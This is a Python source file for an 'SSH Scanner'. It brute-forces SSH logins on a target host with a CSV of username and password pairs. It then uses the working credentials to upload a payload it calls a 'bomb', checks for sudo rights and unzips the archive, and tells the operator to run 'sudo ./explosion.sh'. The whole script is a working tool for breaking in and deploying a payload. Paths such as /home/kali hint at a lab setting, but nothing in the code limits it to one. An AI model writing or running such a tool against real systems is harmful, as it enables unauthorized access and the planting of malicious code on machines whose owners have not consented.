from fabric import Connection, Config
import sys
from pyfiglet import Figlet

CRED_FILE = ""
HOST = ""
PORT = None
user_creds = []
successful = 0
successful_creds = []
cockpit_file = "explosion.sh"

def is_arguments_ok(args):
    global CRED_FILE, HOST, PORT
    if len(args) < 3:
        print("Syntax: python3 ssh_bot.py <Credential CSV> <HOST IPV4> <PORT>")
        return False
    CRED_FILE = args[0]
    HOST = args[1]
    PORT = args[2]
    return True

def parse_file():
    global user_creds
    with open(CRED_FILE, "r") as file:
        user_creds = file.readlines()
       
def ssh_connection():
    global successful, successful_creds
    for line in user_creds:
        creds = line.split(",")
        username = creds[0]
        password = creds[1]
        conn = Connection(
            HOST, 
            port=PORT, 
            user=username, 
            connect_kwargs={'password': password})
        try:
            conn.run('pwd', hide=True)
            #print(dir)
            print(f"*** {HOST} IS OPEN VIA {PORT} WITH {username}:{password} ***")
            '''
            local_path = "/home/kali/Desktop/test.txt"
            remote_path = "/home/thor/Desktop/test.txt"
            conn.put(local_path, remote_path)
            '''
            successful += 1
            successful_creds.append((username, password))
        except Exception as e:
            #print(e)
            print(f"{HOST} is unreachable with {username}:{password}")

def print_banner():
    font = Figlet(font="small")
    banner = font.renderText("SSH Scanner")
    print(banner)

def conclusion():
    print("\n** Scanning Complete **")
    print(f"{successful} credential(s) penetrated successfully!")
    print("\n")
    for cred in successful_creds:
        username, password = cred
        print(f"username: {username}, password: {password}")
    print("\n")

def want_to_plant_bomb():
    user_resp = input("Do you want to plant the bombs (playloads)? [y/n]: ")
    if user_resp.lower() == "y" or user_resp.lower() == "yes":
        return True
    return False

def plant_the_bomb():
    print("\n** Planting Bomb AKA Payload **")
    local_path = input("Absolute path of payload in your filesystem: ")
    remote_path = input("Absolute path where you want the bomb to be planted in target filesystem: ")
    is_bomb_planted = False
    for username, password in successful_creds:
        print(f"\n*** Attempting Bomb planting via {username}:{password} ***")
        try:
            conn = Connection(
                HOST, 
                port=PORT, 
                user=username, 
                connect_kwargs={'password': password})
            conn.put(local_path, remote_path)
            is_bomb_planted = True
            if extract_the_bomb(conn, local_path, remote_path):
                print(f"*** Payload has been extracted! SSH into the machine via {username}:{password} and run:  cd Desktop/payload && sudo ./explosion.sh ***")
                return
            print("!!! Payload needs sudo privilege to be executed. Sorry !!!")
        except Exception as e:
            print(e)
            print("Something went wrong!")
        finally:
            if is_bomb_planted:
                break

def extract_the_bomb(conn, local_path, remote_path):
    if has_sudo_privilege(conn):
        '''
        sudo_conn = Connection(
            HOST, 
            user=username, 
            config=Config(overrides = {'sudo': {'password': password}})
        )
        '''
        filename = local_path.split("/")[-1]
        with conn.cd(remote_path):
            conn.run(f"unzip {filename}", hide=True)
        '''    
        with conn.cd(dirname):
            sudo_conn.sudo(f"./{cockpit_file}")
        '''
        return True
    return False

def has_sudo_privilege(conn):
    groups = conn.run("groups", hide=True)
    if "sudo" in str(groups):
        return True
    return False

if __name__ == "__main__":
    if is_arguments_ok(sys.argv[1:]):
        # 0 is file name, needs everything from 1 ...
        print_banner()
        parse_file()
        ssh_connection()
        conclusion()
        if successful > 0 and want_to_plant_bomb():
            plant_the_bomb()
        print("\n** Operation Complete! **")



    